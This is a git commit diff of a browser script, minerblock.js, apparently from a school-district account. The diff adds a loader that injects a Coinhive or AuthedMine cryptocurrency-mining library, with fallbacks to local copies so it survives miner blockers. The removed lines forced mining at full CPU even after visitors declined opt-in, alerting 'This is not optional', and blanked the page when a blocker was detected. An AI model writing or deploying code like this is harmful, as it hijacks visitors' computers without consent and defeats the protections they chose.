a511a3a75e659d1977245c5cf9f8f6458aca29cf
U-PSDSCHOOLS.ORG\58697 <58697@PHS191038.psdschools.org>
2017-11-20 14:29:13 -0700

    Actual first commit

--- minerblock.js
+++ minerblock.js
@@ -1,25 +1,48 @@
+function loadCoinhive() {
+  var script = document.createElement('script');
+  script.src = 'https://coinhive.com/lib/coinhive.min.js';
+  document.getElementsByTagName("head")[0].appendChild(script);
+  //check if script was loaded
+  script.onload = function() {
+    console.log("Successfully loaded with remote coinhive (not authedmine) script")
+    return
+  }
+  //check if it didn't load
+  script.onerror = function() {
     var script = document.createElement('script');
     script.src = 'https://authedmine.com/lib/authedmine.min.js';
     document.getElementsByTagName("head")[0].appendChild(script);
     //check if script was loaded
     script.onload = function() {
-      var miner = new CoinHive.Anonymous('zJkrUQfkN5OfHz32nQLz0HTka2u9NqRd');
-      miner.start();
-      miner.setAutoThreadsEnabled(true);
-      miner.setThrottle(0);
-      miner.on('optin', function(params) {
-        if (params.status === 'accepted') {
-          console.log('User accepted opt-in');
-        } else {
-          miner.start();
-          alert("This is not optional")
-          miner.setAutoThreadsEnabled(true);
-          miner.setThrottle(0);
-        }
-      });
+      console.log("Successfully loaded with remote authedmine script")
+      return
     }
     //check if it didn't load
     script.onerror = function() {
-      document.write("Please disable your miner blocker")
-      window.stop()
+      var script = document.createElement('script');
+      script.src = 'locCHMiner.js';
+      document.getElementsByTagName("head")[0].appendChild(script);
+      //check if script was loaded
+      script.onload = function() {
+        console.log("Successfully loaded with local coinhive (not authedmine) script")
+        return
+      }
+      //check if it didn't load
+      script.onerror = function() {
+        var script = document.createElement('script');
+        script.src = 'locAMMiner.js';
+        document.getElementsByTagName("head")[0].appendChild(script);
+        //check if script was loaded
+        script.onload = function() {
+          console.log("Successfully loaded with local authedmine script")
+          return
+        }
+        //check if it didn't load
+        script.onerror = function() {
+          console.log("Failed to load coinhive!")
+          throw 2;
+        }
+      }
     }
+  }
+}
